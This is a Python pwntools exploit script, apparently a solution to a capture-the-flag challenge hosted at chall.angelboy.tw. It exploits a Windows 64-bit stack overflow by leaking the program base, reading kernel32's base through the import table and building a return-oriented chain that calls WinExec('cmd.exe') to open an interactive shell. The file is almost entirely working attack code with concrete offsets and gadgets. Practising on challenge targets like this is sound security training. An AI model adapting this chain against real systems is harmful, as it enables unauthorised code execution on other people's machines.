#!/usr/bin/env python3
from pwn import *

# windows 64bit
context(arch='amd64', os='windows')
context.log_level = 'debug'

# nc chall.angelboy.tw 56002
c = remote('chall.angelboy.tw', 56002)

# output
"""
Main:00007FF6EB291110
###############################
Do you know return to library ?
###############################
Name:a
What do you want to see in memory?
Give me an address (in hex) : 00007FF6EB291110
The content of the address : 4800000148EC8148
Leave some message for me : 
"""


# Main:00007FF6EB291110
c.recvuntil('Main:') # drop
main_addr = c.recvline().decode().strip()
main_addr = int(main_addr, 16)
log.info('main_addr: ' + hex(main_addr))

main_offset = 0x0000000000001110
base_addr = main_addr - main_offset
log.info('base_addr: ' + hex(base_addr))

name_offset = 0x40b0
name_addr = base_addr + name_offset
log.info('name_addr: ' + hex(name_addr))



# Name:cmd
c.sendlineafter('Name:', 'cmd.exe\0') 

iat_offset = 0x2000 # iat start and UnhandledExceptionFilter
iat_addr = base_addr + iat_offset
log.info('iat_addr: ' + hex(iat_addr))
# 0x2030 GetModuleHandleW
getmodulehandlew_offset = 0x1ce40

c.sendlineafter('Give me an address (in hex) :', hex(iat_addr + 0x30)[2:])
c.recvuntil('The content of the address : ')
getmodulehandlew_addr = c.recvline().decode().strip()
getmodulehandlew_addr = int(getmodulehandlew_addr, 16)
log.info('getmodulehandlew_addr: ' + hex(getmodulehandlew_addr))
kernel32_base = getmodulehandlew_addr - getmodulehandlew_offset
log.info('kernel32_base: ' + hex(kernel32_base))

# we target "WinExec("cmd.exe")"
winexec_offset = 0x0000000000001280
winexec_addr = kernel32_base + winexec_offset
log.info('winexec_addr: ' + hex(winexec_addr))

# rcx rdx r8 r9
# gadgets kernel32 http://ropshell.com/ropsearch?h=57c9f99d647340947005738600d087e1 
"""
ropshell> use 57c9f99d647340947005738600d087e1 (download)
name         : kernel32.dll (x86_64/PE)

0x00075fa3 : pop rcx; ret 0
"""
pop_rcx = kernel32_base + 0x00075fa3
ret_addr = pop_rcx + 1
log.info('pop_rcx: ' + hex(pop_rcx))
log.info('ret_addr: ' + hex(ret_addr))

# our rop chain
rop = p64(pop_rcx)
rop += p64(name_addr)
rop += p64(pop_rcx + 1)
rop += p64(winexec_addr)
#rop = p64(main_addr + 0x42)

# we need to fill the stack
# _read(0,local_108,0x400);
payload = b'a' * 0x108 + rop

c.sendafter('Leave some message for me :', payload)





c.interactive()
